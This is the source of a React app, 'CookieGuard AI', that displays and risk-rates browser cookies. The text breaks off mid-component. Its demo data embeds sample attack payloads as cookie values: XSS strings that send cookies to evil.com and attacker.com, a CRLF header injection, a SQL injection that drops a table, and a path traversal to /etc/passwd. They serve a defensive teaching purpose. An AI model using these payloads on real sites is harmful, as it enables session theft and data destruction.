import React, { useState, useMemo } from 'react';
import './App.css';

// Demo data for testing
const demoData = [
  {
    "id": 1,
    "category": "normal",
    "subcategory": "session",
    "name": "session_id",
    "value": "sess_a1b2c3d4e5f6g7h8i9j0",
    "domain": ".example.com",
    "path": "/",
    "expires": "2026-03-03T00:00:00Z",
    "httpOnly": true,
    "secure": true,
    "sameSite": "Strict",
    "risk": "low",
    "description": "Properly secured session cookie"
  },
  {
    "id": 2,
    "category": "normal",
    "subcategory": "preferences",
    "name": "user_prefs",
    "value": "theme=dark&notifications=on",
    "domain": ".example.com",
    "path": "/",
    "expires": "2027-02-03T00:00:00Z",
    "httpOnly": false,
    "secure": true,
    "sameSite": "Lax",
    "risk": "low",
    "description": "User preference cookie with standard security"
  },
  {
    "id": 3,
    "category": "normal",
    "subcategory": "analytics",
    "name": "_ga",
    "value": "GA1.2.1234567890.1706918400",
    "domain": ".example.com",
    "path": "/",
    "expires": "2028-02-03T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "low",
    "description": "Google Analytics tracking cookie"
  },
  {
    "id": 4,
    "category": "normal",
    "subcategory": "authentication",
    "name": "auth_token",
    "value": "eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwMX0.valid_sig",
    "domain": "api.example.com",
    "path": "/v1",
    "expires": "2026-02-04T12:00:00Z",
    "httpOnly": true,
    "secure": true,
    "sameSite": "Strict",
    "risk": "low",
    "description": "JWT auth token with proper flags"
  },
  {
    "id": 5,
    "category": "session_hijacking",
    "subcategory": "reflected_xss",
    "name": "search_query",
    "value": "<script>alert('XSS')</script>",
    "domain": ".vulnerable-site.com",
    "path": "/search",
    "expires": "2026-02-10T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Cookie containing reflected XSS payload - can steal session tokens"
  },
  {
    "id": 6,
    "category": "session_hijacking",
    "subcategory": "stored_xss",
    "name": "user_bio",
    "value": "<img src=x onerror=alert(document.cookie)>",
    "domain": ".vulnerable-site.com",
    "path": "/profile",
    "expires": "2026-06-01T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Stored XSS via image onerror - enables session hijacking"
  },
  {
    "id": 7,
    "category": "session_hijacking",
    "subcategory": "dom_xss",
    "name": "redirect_url",
    "value": "javascript:document.location='http://evil.com/?c='+document.cookie",
    "domain": ".vulnerable-site.com",
    "path": "/",
    "expires": "2026-02-05T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "DOM-based XSS - redirects user and steals cookies"
  },
  {
    "id": 8,
    "category": "session_hijacking",
    "subcategory": "missing_httponly",
    "name": "PHPSESSID",
    "value": "abc123xyz789sessiontoken",
    "domain": ".insecure-app.com",
    "path": "/",
    "expires": "2026-02-04T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "high",
    "description": "Session cookie accessible via JavaScript - vulnerable to XSS theft"
  },
  {
    "id": 9,
    "category": "session_hijacking",
    "subcategory": "missing_secure",
    "name": "admin_session",
    "value": "admin_9f8e7d6c5b4a3210fedcba",
    "domain": ".insecure-app.com",
    "path": "/admin",
    "expires": "2026-02-04T06:00:00Z",
    "httpOnly": true,
    "secure": false,
    "sameSite": "Lax",
    "risk": "high",
    "description": "Admin session transmitted over HTTP - vulnerable to MITM hijacking"
  },
  {
    "id": 10,
    "category": "session_hijacking",
    "subcategory": "svg_xss",
    "name": "avatar_data",
    "value": "<svg onload=fetch('http://attacker.com/steal?c='+document.cookie)>",
    "domain": ".vulnerable-site.com",
    "path": "/",
    "expires": "2026-04-01T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "XSS payload using SVG - exfiltrates session cookies"
  },
  {
    "id": 11,
    "category": "unauthorized_actions",
    "subcategory": "csrf_vulnerable",
    "name": "csrf_session",
    "value": "sess_vulnerable_to_csrf_attack",
    "domain": ".legacy-app.com",
    "path": "/",
    "expires": "2026-02-05T00:00:00Z",
    "httpOnly": true,
    "secure": true,
    "sameSite": "None",
    "risk": "high",
    "description": "Session without SameSite - vulnerable to CSRF attacks"
  },
  {
    "id": 12,
    "category": "unauthorized_actions",
    "subcategory": "privilege_escalation",
    "name": "role",
    "value": "admin",
    "domain": ".injectable-site.com",
    "path": "/",
    "expires": "2026-02-15T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Client-side role cookie - easily manipulated for privilege escalation"
  },
  {
    "id": 13,
    "category": "unauthorized_actions",
    "subcategory": "price_tampering",
    "name": "cart_data",
    "value": "{\"items\":[],\"discount\":100,\"price\":0}",
    "domain": ".injectable-site.com",
    "path": "/checkout",
    "expires": "2026-02-06T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "high",
    "description": "Manipulated JSON cookie for unauthorized price tampering"
  },
  {
    "id": 14,
    "category": "unauthorized_actions",
    "subcategory": "header_injection",
    "name": "language",
    "value": "en\r\nSet-Cookie: admin=true",
    "domain": ".injectable-site.com",
    "path": "/",
    "expires": "2026-03-01T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "CRLF injection to set unauthorized admin cookie"
  },
  {
    "id": 15,
    "category": "unauthorized_actions",
    "subcategory": "sql_injection",
    "name": "user_id",
    "value": "1' OR '1'='1'; DROP TABLE users;--",
    "domain": ".injectable-site.com",
    "path": "/api",
    "expires": "2026-02-08T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "SQL injection payload - unauthorized database access"
  },
  {
    "id": 16,
    "category": "unauthorized_actions",
    "subcategory": "path_traversal",
    "name": "file_path",
    "value": "../../etc/passwd",
    "domain": ".injectable-site.com",
    "path": "/uploads",
    "expires": "2026-02-10T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Path traversal - unauthorized file system access"
  },
  {
    "id": 17,
    "category": "subdomain_takeover",
    "subcategory": "wildcard_domain",
    "name": "remember_token",
    "value": "permanent_session_never_expires_12345",
    "domain": ".bad-practice.com",
    "path": "/",
    "expires": "2030-12-31T23:59:59Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "high",
    "description": "Wildcard domain cookie - any subdomain can access/modify"
  },
  {
    "id": 18,
    "category": "subdomain_takeover",
    "subcategory": "compromised_subdomain",
    "name": "auth",
    "value": "malicious_token_from_subdomain",
    "domain": "evil.example.com",
    "path": "/",
    "expires": "2026-02-20T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Cookie set from compromised subdomain affecting parent domain"
  },
  {
    "id": 19,
    "category": "subdomain_takeover",
    "subcategory": "dangling_dns",
    "name": "api_token",
    "value": "token_from_abandoned_subdomain",
    "domain": "old-api.example.com",
    "path": "/",
    "expires": "2026-04-01T00:00:00Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "None",
    "risk": "critical",
    "description": "Dangling DNS record - subdomain can be claimed by attacker"
  },
  {
    "id": 20,
    "category": "normal",
    "subcategory": "csrf_protection",
    "name": "csrf_token",
    "value": "f8a9c2e1d4b7a6c3e8f1d2b5",
    "domain": ".secure-app.com",
    "path": "/",
    "expires": null,
    "httpOnly": true,
    "secure": true,
    "sameSite": "Strict",
    "risk": "low",
    "description": "Properly implemented CSRF token cookie"
  }
];

// Icons - Customizable icon set
const Icons = {
  Cookie: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/>
      <circle cx="8" cy="9" r="1" fill="currentColor"/>
      <circle cx="15" cy="8" r="1" fill="currentColor"/>
      <circle cx="10" cy="14" r="1" fill="currentColor"/>
      <circle cx="16" cy="13" r="1" fill="currentColor"/>
      <circle cx="12" cy="11" r="1" fill="currentColor"/>
    </svg>
  ),
  Shield: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
    </svg>
  ),
  ShieldCheck: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      <path d="M9 12l2 2 4-4"/>
    </svg>
  ),
  ShieldAlert: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      <path d="M12 8v4"/><path d="M12 16h.01"/>
    </svg>
  ),
  AlertTriangle: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
      <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
    </svg>
  ),
  AlertOctagon: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/>
      <line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
    </svg>
  ),
  Bug: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M8 2l1.88 1.88"/><path d="M14.12 3.88L16 2"/><path d="M9 7.13v-1a3.003 3.003 0 116 0v1"/>
      <path d="M12 20c-3.3 0-6-2.7-6-6v-3a4 4 0 014-4h4a4 4 0 014 4v3c0 3.3-2.7 6-6 6"/>
      <path d="M12 20v-9"/><path d="M6.53 9C4.6 8.8 3 7.1 3 5"/><path d="M6 13H2"/>
      <path d="M3 21c0-2.1 1.7-3.9 3.8-4"/><path d="M20.97 5c0 2.1-1.6 3.8-3.5 4"/>
      <path d="M22 13h-4"/><path d="M17.2 17c2.1.1 3.8 1.9 3.8 4"/>
    </svg>
  ),
  Skull: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="9" cy="12" r="1"/><circle cx="15" cy="12" r="1"/>
      <path d="M8 20v2h8v-2"/><path d="M12.5 17l-.5-1-.5 1h1z"/>
      <path d="M16 20a2 2 0 002-2V9A6 6 0 006 9v9a2 2 0 002 2"/>
    </svg>
  ),
  Flame: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M8.5 14.5A2.5 2.5 0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 11-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 002.5 2.5z"/>
    </svg>
  ),
  Zap: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
    </svg>
  ),
  Lock: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
    </svg>
  ),
  Unlock: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 019.9-1"/>
    </svg>
  ),
  ChevronDown: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="6 9 12 15 18 9"/>
    </svg>
  ),
  ChevronRight: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="9 18 15 12 9 6"/>
    </svg>
  ),
  Globe: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/>
      <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
    </svg>
  ),
  Upload: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/>
    </svg>
  ),
  Download: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
    </svg>
  ),
  Play: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polygon points="5 3 19 12 5 21 5 3"/>
    </svg>
  ),
  Check: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 6 9 17 4 12"/>
    </svg>
  ),
  CheckCircle: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
    </svg>
  ),
  X: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
    </svg>
  ),
  XCircle: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
    </svg>
  ),
  Info: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>
    </svg>
  ),
  Folder: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
    </svg>
  ),
  Tag: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/>
      <line x1="7" y1="7" x2="7.01" y2="7"/>
    </svg>
  ),
  Code: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
    </svg>
  ),
  Database: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/>
      <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>
    </svg>
  ),
  Key: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
    </svg>
  ),
  Eye: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  ),
  EyeOff: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  ),
  Syringe: () => (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M18 2l4 4"/><path d="M17 7l3-3"/><path d="M19 9l-8.7 8.7c-.4.4-.8.7-1.2.9l-4.1 2.1-2-2 2.1-4.1c.2-.5.5-.9.9-1.2L15 5"/>
      <path d="M5 19l-2 2"/><path d="M11 11l4 4"/>
    </svg>
  ),
};

// Category configuration - 3 Critical Attack Categories
const categoryConfig = {
  // Normal/Secure
  normal: { label: 'Secure', color: '#10b981', bgColor: '#d1fae5', icon: 'ShieldCheck' },
  
  // Session Hijacking (includes old xss_vulnerable)
  session_hijacking: { label: 'Session Hijacking', color: '#dc2626', bgColor: '#fee2e2', icon: 'Code' },
  xss_vulnerable: { label: 'Session Hijacking', color: '#dc2626', bgColor: '#fee2e2', icon: 'Code' },
  
  // Unauthorized Actions (includes old cookie_injection)
  unauthorized_actions: { label: 'Unauthorized Actions', color: '#ea580c', bgColor: '#ffedd5', icon: 'Key' },
  cookie_injection: { label: 'Unauthorized Actions', color: '#ea580c', bgColor: '#ffedd5', icon: 'Key' },
  
  // Subdomain Takeover
  subdomain_takeover: { label: 'Subdomain Takeover', color: '#7c3aed', bgColor: '#ede9fe', icon: 'Globe' },
};

// Normalize category names (map old names to new names)
const normalizeCategory = (category) => {
  const mapping = {
    'xss_vulnerable': 'session_hijacking',
    'cookie_injection': 'unauthorized_actions',
  };
  return mapping[category] || category;
};

const riskConfig = {
  critical: { color: '#dc2626', bgColor: '#fee2e2', label: 'Critical' },
  high: { color: '#ea580c', bgColor: '#ffedd5', label: 'High' },
  medium: { color: '#f59e0b', bgColor: '#fef3c7', label: 'Medium' },
  low: { color: '#10b981', bgColor: '#d1fae5', label: 'Low' },
};

function App() {
  const [cookies, setCookies] = useState([]);
  const [results, setResults] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [activeTab, setActiveTab] = useState('upload');
  const [viewMode, setViewMode] = useState('domain'); // 'domain' or 'category'
  const [expandedGroups, setExpandedGroups] = useState({});
  const [expandedCookies, setExpandedCookies] = useState({});
  const [appIcon, setAppIcon] = useState(() => {
    // Load saved icon from localStorage on init
    return localStorage.getItem('cookieguard_app_icon') || null;
  });

  // Handle app icon upload
  const handleIconUpload = (event) => {
    const file = event.target.files[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => {
        const iconData = e.target.result;
        setAppIcon(iconData);
        // Save to localStorage for persistence
        localStorage.setItem('cookieguard_app_icon', iconData);
      };
      reader.readAsDataURL(file);
    }
  };

  // Reset to default icon
  const resetAppIcon = (e) => {
    e.preventDefault();
    e.stopPropagation();
    setAppIcon(null);
    localStorage.removeItem('cookieguard_app_icon');
  };

  const handleFileUpload = (event) => {
    const file = event.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        try {
          const json = JSON.parse(e.target.result);
          const cookieArray = Array.isArray(json) ? json : json.cookies || [];
          setCookies(cookieArray);
          setError(null);
          if (cookieArray.length > 0) {
            setActiveTab('review');
          }
        } catch (err) {
          setError('Invalid JSON file. Please upload a valid cookie export.');
        }
      };
      reader.readAsText(file);
    }
  };

  const loadDemoData = () => {
    setCookies(demoData);
    setActiveTab('review');
  };

  const analyzeCookies = () => {
    if (cookies.length === 0) {
      setError('No cookies to analyze');
      return;
    }
    setLoading(true);
    setError(null);
    
    // Simulate analysis
    setTimeout(() => {
      setResults({
        cookies: cookies,
        analyzed: true,
        timestamp: new Date().toISOString()
      });
      setActiveTab('results');
      setLoading(false);
    }, 800);
  };

  // Group cookies by domain
  const groupedByDomain = useMemo(() => {
    const data = results?.cookies || cookies;
    const groups = {};
    data.forEach(cookie => {
      const domain = cookie.domain || 'Unknown';
      if (!groups[domain]) {
        groups[domain] = { cookies: [], risks: { critical: 0, high: 0, medium: 0, low: 0 } };
      }
      groups[domain].cookies.push(cookie);
      const risk = cookie.risk || 'low';
      groups[domain].risks[risk]++;
    });
    return groups;
  }, [cookies, results]);

  // Group cookies by category (normalized)
  const groupedByCategory = useMemo(() => {
    const data = results?.cookies || cookies;
    const groups = {};
    data.forEach(cookie => {
      const category = normalizeCategory(cookie.category || 'normal');
      if (!groups[category]) {
        groups[category] = { cookies: [], risks: { critical: 0, high: 0, medium: 0, low: 0 } };
      }
      groups[category].cookies.push(cookie);
      const risk = cookie.risk || 'low';
      groups[category].risks[risk]++;
    });
    return groups;
  }, [cookies, results]);

  // Summary stats
  const summaryStats = useMemo(() => {
    const data = results?.cookies || cookies;
    const stats = { total: data.length, critical: 0, high: 0, medium: 0, low: 0, domains: new Set() };
    data.forEach(cookie => {
      const risk = cookie.risk || 'low';
      stats[risk]++;
      stats.domains.add(cookie.domain || 'Unknown');
    });
    stats.domainCount = stats.domains.size;
    return stats;
  }, [cookies, results]);

  const toggleGroup = (key) => {
    setExpandedGroups(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const toggleCookie = (key) => {
    setExpandedCookies(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const getHighestRisk = (risks) => {
    if (risks.critical > 0) return 'critical';
    if (risks.high > 0) return 'high';
    if (risks.medium > 0) return 'medium';
    return 'low';
  };

  const renderGroupHeader = (key, group, type) => {
    const isExpanded = expandedGroups[key];
    const highestRisk = getHighestRisk(group.risks);
    const config = type === 'category' ? categoryConfig[key] : null;
    const IconComponent = type === 'category' && config?.icon ? Icons[config.icon] : (type === 'domain' ? Icons.Globe : Icons.Tag);
    
    return (
      <div 
        className={`group-header ${isExpanded ? 'expanded' : ''}`}
        onClick={() => toggleGroup(key)}
      >
        <div className="group-header-left">
          <span className={`expand-icon ${isExpanded ? 'expanded' : ''}`}>
            <Icons.ChevronRight />
          </span>
          <span className="group-icon" style={config ? { color: config.color } : {}}>
            <IconComponent />
          </span>
          <span className="group-name">
            {type === 'category' ? (config?.label || key) : key}
          </span>
          <span className="group-count">{group.cookies.length}</span>
        </div>
        <div className="group-header-right">
          {group.risks.critical > 0 && (
            <span className="risk-pill critical">{group.risks.critical} Critical</span>
          )}
          {group.risks.high > 0 && (
            <span className="risk-pill high">{group.risks.high} High</span>
          )}
          {group.risks.medium > 0 && (
            <span className="risk-pill medium">{group.risks.medium} Medium</span>
          )}
          {group.risks.low > 0 && (
            <span className="risk-pill low">{group.risks.low} Safe</span>
          )}
        </div>
      </div>
    );
  };

  const renderCookieDetails = (cookie, idx) => {
    const cookieKey = `${cookie.domain}-${cookie.name}-${idx}`;
    const isExpanded = expandedCookies[cookieKey];
    const risk = cookie.risk || 'low';
    const riskStyle = riskConfig[risk];
    const normalizedCategory = normalizeCategory(cookie.category || 'normal');
    const catConfig = categoryConfig[normalizedCategory] || categoryConfig.normal;

    return (
      <div key={cookieKey} className="cookie-card">
        <div 
          className="cookie-header"
          onClick={() => toggleCookie(cookieKey)}
        >
          <div className="cookie-header-left">
            <span className={`expand-icon small ${isExpanded ? 'expanded' : ''}`}>
              <Icons.ChevronRight />
            </span>
            <span className="cookie-name">{cookie.name}</span>
            <span 
              className="category-badge"
              style={{ backgroundColor: catConfig.bgColor, color: catConfig.color }}
            >
              {catConfig.label}
            </span>
          </div>
          <span 
            className="risk-badge"
            style={{ backgroundColor: riskStyle.bgColor, color: riskStyle.color }}
          >
            {riskStyle.label}
          </span>
        </div>
        
        {isExpanded && (
          <div className="cookie-details">
            <div className="detail-grid">
              <div className="detail-item">
                <span className="detail-label">Domain</span>
                <span className="detail-value">{cookie.domain}</span>
              </div>
              <div className="detail-item">
                <span className="detail-label">Path</span>
                <span className="detail-value">{cookie.path || '/'}</span>
              </div>
              <div className="detail-item">
                <span className="detail-label">Subcategory</span>
                <span className="detail-value">{cookie.subcategory || 'N/A'}</span>
              </div>
              <div className="detail-item">
                <span className="detail-label">Expires</span>
                <span className="detail-value">
                  {cookie.expires ? new Date(cookie.expires).toLocaleDateString() : 'Session'}
                </span>
              </div>
            </div>
            
            <div className="security-flags">
              <span className={`flag ${cookie.httpOnly ? 'secure' : 'insecure'}`}>
                {cookie.httpOnly ? <Icons.Check /> : <Icons.X />}
                HttpOnly
              </span>
              <span className={`flag ${cookie.secure ? 'secure' : 'insecure'}`}>
                {cookie.secure ? <Icons.Check /> : <Icons.X />}
                Secure
              </span>
              <span className={`flag ${cookie.sameSite === 'Strict' || cookie.sameSite === 'Lax' ? 'secure' : 'insecure'}`}>
                {cookie.sameSite === 'Strict' || cookie.sameSite === 'Lax' ? <Icons.Check /> : <Icons.X />}
                SameSite: {cookie.sameSite || 'None'}
              </span>
            </div>

            {cookie.description && (
              <div className="cookie-description">
                <Icons.Info />
                <span>{cookie.description}</span>
              </div>
            )}

            {risk !== 'low' && (
              <div className="recommendations-box">
                <strong>Recommendations:</strong>
                <ul>
                  {!cookie.httpOnly && <li>Enable HttpOnly flag to prevent JavaScript access</li>}
                  {!cookie.secure && <li>Enable Secure flag for HTTPS-only transmission</li>}
                  {(cookie.sameSite === 'None' || !cookie.sameSite) && <li>Set SameSite to Lax or Strict for CSRF protection</li>}
                  {(normalizedCategory === 'session_hijacking') && <li>Sanitize all user inputs and implement Content Security Policy</li>}
                  {(normalizedCategory === 'unauthorized_actions') && <li>Implement server-side validation and never trust client-side data</li>}
                  {(normalizedCategory === 'subdomain_takeover') && <li>Limit cookie scope to specific subdomains and audit DNS records</li>}
                </ul>
              </div>
            )}
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="app">
      {/* Compact Header */}
      <header className="header">
        <div className="header-content">
          <div className="logo">
            <label className="logo-icon-wrapper" title="Click to change icon">
              {appIcon ? (
                <>
                  <img src={appIcon} alt="App Icon" className="custom-logo-icon" />
                  <button className="reset-icon-btn" onClick={resetAppIcon} title="Reset to default">×</button>
                </>
              ) : (
                <span className="logo-icon"><Icons.Cookie /></span>
              )}
              <input 
                type="file" 
                accept="image/*" 
                onChange={handleIconUpload} 
                hidden 
              />
            </label>
            <span className="logo-text">CookieGuard AI</span>
          </div>
          <nav className="nav-tabs">
            <button 
              className={`nav-tab ${activeTab === 'upload' ? 'active' : ''}`}
              onClick={() => setActiveTab('upload')}
            >
              <Icons.Upload />
              Upload
            </button>
            <button 
              className={`nav-tab ${activeTab === 'review' ? 'active' : ''}`}
              onClick={() => setActiveTab('review')}
              disabled={cookies.length === 0}
            >
              <Icons.Folder />
              Review ({cookies.length})
            </button>
            <button 
              className={`nav-tab ${activeTab === 'results' ? 'active' : ''}`}
              onClick={() => setActiveTab('results')}
              disabled={!results}
            >
              <Icons.Shield />
              Results
            </button>
          </nav>
        </div>
      </header>

      <main className="main">
        {error && (
          <div className="alert error">
            <Icons.AlertTriangle />
            <span>{error}</span>
            <button onClick={() => setError(null)}><Icons.X /></button>
          </div>
        )}

        {/* Upload Tab */}
        {activeTab === 'upload' && (
          <div className="upload-container">
            <div className="upload-hero">
              <div className="hero-icon"><Icons.Shield /></div>
              <h1>Detect Cookie Security Issues</h1>
              <p>Upload your cookies or try the demo to analyze security vulnerabilities</p>
            </div>
            
            <div className="upload-cards">
              <div className="upload-card">
                <div className="card-icon"><Icons.Upload /></div>
                <h3>Upload Cookies</h3>
                <p>Export cookies from your browser as JSON</p>
                <input type="file" accept=".json" onChange={handleFileUpload} id="file-upload" hidden />
                <label htmlFor="file-upload" className="btn btn-primary">Choose File</label>
              </div>
              
              <div className="upload-card">
                <div className="card-icon"><Icons.Play /></div>
                <h3>Try Demo</h3>
                <p>Load 20 example cookies with various security issues</p>
                <button className="btn btn-secondary" onClick={loadDemoData}>Load Demo</button>
              </div>
            </div>

            <div className="info-card">
              <h4><Icons.Info /> How it works</h4>
              <div className="steps">
                <div className="step"><span>1</span>Export cookies using a browser extension</div>
                <div className="step"><span>2</span>Upload the JSON file or try the demo</div>
                <div className="step"><span>3</span>Get instant security analysis</div>
              </div>
            </div>
          </div>
        )}

        {/* Review Tab */}
        {activeTab === 'review' && (
          <div className="review-container">
